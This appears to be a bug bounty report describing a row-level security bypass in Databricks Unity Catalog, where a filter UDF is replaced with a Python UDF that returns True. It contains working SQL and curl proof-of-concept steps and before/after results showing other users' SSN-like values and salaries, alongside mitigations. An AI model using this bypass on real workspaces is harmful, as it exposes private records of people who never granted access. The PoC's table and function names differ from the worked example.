# HackerOne Report: Row-Level Security Bypass via Python UDF Replacement

## Summary
A critical vulnerability exists in Databricks Unity Catalog that allows users with `CREATE FUNCTION` permission to bypass Row-Level Security (Row Filters) by replacing SQL UDF filter functions with Python UDFs that always return `True`. This grants unauthorized access to ALL rows in protected tables, including sensitive data belonging to other users.

## Severity
**Critical** (CVSS 3.1: 8.8)
- **Attack Vector:** Network
- **Attack Complexity:** Low
- **Privileges Required:** Low (CREATE FUNCTION permission)
- **User Interaction:** None
- **Scope:** Changed
- **Confidentiality Impact:** High
- **Integrity Impact:** Low
- **Availability Impact:** None

## Affected Component
- **Product:** Databricks Unity Catalog
- **Feature:** Row Filters (Row-Level Security)
- **Environment:** AWS Serverless SQL Warehouse (DBR 17.2)
- **Tested On:** dbc-4b448b2e-59b6.cloud.databricks.com

## Vulnerability Details

### Background
Databricks Row Filters allow table owners to restrict row access based on user identity using SQL or Python UDFs. When a query is executed against a filtered table, the UDF is called for each row to determine visibility.

### Vulnerability
Users with `CREATE FUNCTION` permission in the same schema can use `CREATE OR REPLACE FUNCTION` to replace an existing SQL UDF (used as a row filter) with a Python UDF that always returns `True`. This bypasses the access control logic entirely.

### Root Cause
1. No integrity protection on functions used as row filters
2. `CREATE OR REPLACE` allows overwriting functions without ownership check
3. Python UDFs can return arbitrary values without validation
4. No audit trail distinguishing filter function modifications

## Attack Flow

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   Admin creates │     │  Attacker with  │     │   Attacker now  │
│  protected table│────▶│ CREATE FUNCTION │────▶│  sees ALL data  │
│  + Row Filter   │     │ replaces filter │     │                 │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

### Step-by-Step Attack

1. **Admin Setup** (Victim):
```sql
-- Create table with sensitive data
CREATE TABLE workspace.default.employee_data (
  user_email STRING, 
  ssn STRING, 
  salary INT
);

INSERT INTO workspace.default.employee_data VALUES 
  ('ceo@company.com', '111-11-1111', 1000000),
  ('cfo@company.com', '222-22-2222', 800000),
  ('employee@company.com', '333-33-3333', 100000);

-- Create row filter - users can only see their own data
CREATE FUNCTION workspace.default.employee_filter(email STRING) 
  RETURNS BOOLEAN 
  RETURN email = current_user();

-- Apply row filter
ALTER TABLE workspace.default.employee_data 
  SET ROW FILTER workspace.default.employee_filter ON (user_email);
```

2. **Normal Access** (Before Attack):
```sql
-- User 'employee@company.com' queries the table
SELECT * FROM workspace.default.employee_data;

-- Result: Only sees their own record
-- | user_email            | ssn          | salary  |
-- | employee@company.com  | 333-33-3333  | 100000  |
```

3. **Attack** (Attacker with CREATE FUNCTION permission):
```sql
-- Replace SQL filter with Python UDF that always returns True
CREATE OR REPLACE FUNCTION workspace.default.employee_filter(email STRING) 
  RETURNS BOOLEAN 
  LANGUAGE PYTHON AS $$ 
return True 
$$;
```

4. **Exploitation** (After Attack):
```sql
-- Same user now sees ALL records!
SELECT * FROM workspace.default.employee_data;

-- Result: ALL rows visible
-- | user_email            | ssn          | salary   |
-- | ceo@company.com       | 111-11-1111  | 1000000  |
-- | cfo@company.com       | 222-22-2222  | 800000   |
-- | employee@company.com  | 333-33-3333  | 100000   |
```

## Proof of Concept

### Prerequisites
- Databricks workspace with Unity Catalog
- User account with `CREATE FUNCTION` permission on the target schema
- Table with Row Filter applied using a SQL UDF

### PoC Script
```bash
# Step 1: Verify current access (only own data)
curl -X POST "https://<workspace>.cloud.databricks.com/api/2.0/sql/statements" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "warehouse_id": "<WAREHOUSE_ID>",
    "statement": "SELECT * FROM workspace.default.secret_data",
    "wait_timeout": "30s"
  }'
# Returns: Only user's own row

# Step 2: Replace filter with Python bypass
curl -X POST "https://<workspace>.cloud.databricks.com/api/2.0/sql/statements" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "warehouse_id": "<WAREHOUSE_ID>",
    "statement": "CREATE OR REPLACE FUNCTION workspace.default.legit_filter(email STRING) RETURNS BOOLEAN LANGUAGE PYTHON AS $$ return True $$",
    "wait_timeout": "30s"
  }'
# Returns: SUCCEEDED

# Step 3: Query again - now sees ALL data
curl -X POST "https://<workspace>.cloud.databricks.com/api/2.0/sql/statements" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "warehouse_id": "<WAREHOUSE_ID>",
    "statement": "SELECT * FROM workspace.default.secret_data",
    "wait_timeout": "30s"
  }'
# Returns: ALL rows including admin and other users' data!
```

### Live Test Results

**Before Bypass (SQL UDF filter):**
```json
{
  "result": {
    "data_array": [
      ["tanyia45@doncong.com", "987-65-4321", "100000"]
    ]
  }
}
```

**After Bypass (Python UDF `return True`):**
```json
{
  "result": {
    "data_array": [
      ["admin@company.com", "123-45-6789", "500000"],
      ["tanyia45@doncong.com", "987-65-4321", "100000"],
      ["other@user.com", "555-55-5555", "200000"]
    ]
  }
}
```

## Impact

### Confidentiality
- **Complete bypass of Row-Level Security**
- Unauthorized access to ALL rows in protected tables
- Exposure of sensitive PII (SSN, salaries, medical records, etc.)
- Cross-user data access within the same workspace

### Affected Scenarios
1. **Multi-tenant SaaS applications** using Databricks as backend
2. **HR/Financial systems** with row-based access control
3. **Healthcare data** with patient privacy requirements
4. **Any table** using UDF-based row filters

### Attack Prerequisites
- User account in the workspace
- `CREATE FUNCTION` permission on the schema containing the filter UDF
- Ability to run `CREATE OR REPLACE FUNCTION`

### Privilege Requirements
This attack does NOT require:
- Admin privileges
- Table ownership
- Direct table ALTER permission

## Remediation Recommendations

### Immediate Mitigations
1. **Restrict `CREATE FUNCTION`** permission to trusted administrators only
2. **Use dedicated schemas** for security functions (separate from user schemas)
3. **Monitor audit logs** for `CREATE OR REPLACE FUNCTION` on filter functions
4. **Implement alerts** on row filter function modifications

### Long-term Fixes
1. **Immutable security functions**: Mark functions used as row filters as immutable
2. **Ownership validation**: Only function owner should be able to replace
3. **Function type enforcement**: Prevent Python UDFs from being used as row filters OR
4. **Result validation**: Verify UDF output matches expected access pattern
5. **Audit enhancement**: Log all row filter function changes with security context

### Suggested Implementation
```sql
-- Option 1: Secure function ownership
ALTER FUNCTION workspace.default.row_filter SET IMMUTABLE;

-- Option 2: Schema-level protection
CREATE SCHEMA security WITH OWNER admins;
REVOKE CREATE ON SCHEMA security FROM PUBLIC;
CREATE FUNCTION security.row_filter(...) ...;
ALTER TABLE data SET ROW FILTER security.row_filter ON (...);
```

## Timeline
- **2025-12-06 06:25 UTC**: Vulnerability discovered
- **2025-12-06 06:35 UTC**: PoC developed and confirmed
- **2025-12-06 06:45 UTC**: Report prepared

## References
- [Databricks Row Filters Documentation](https://docs.databricks.com/en/data-governance/unity-catalog/row-and-column-filters.html)
- [Unity Catalog Security Best Practices](https://docs.databricks.com/en/data-governance/unity-catalog/best-practices.html)
- [Python UDF Documentation](https://docs.databricks.com/en/udf/python.html)

## Supporting Materials
- Screenshot of before/after query results
- Burp Suite request/response logs
- Video demonstration (available on request)

---

**Reporter:** Security Researcher
**Program:** Databricks Bug Bounty
**Submission Date:** December 6, 2025

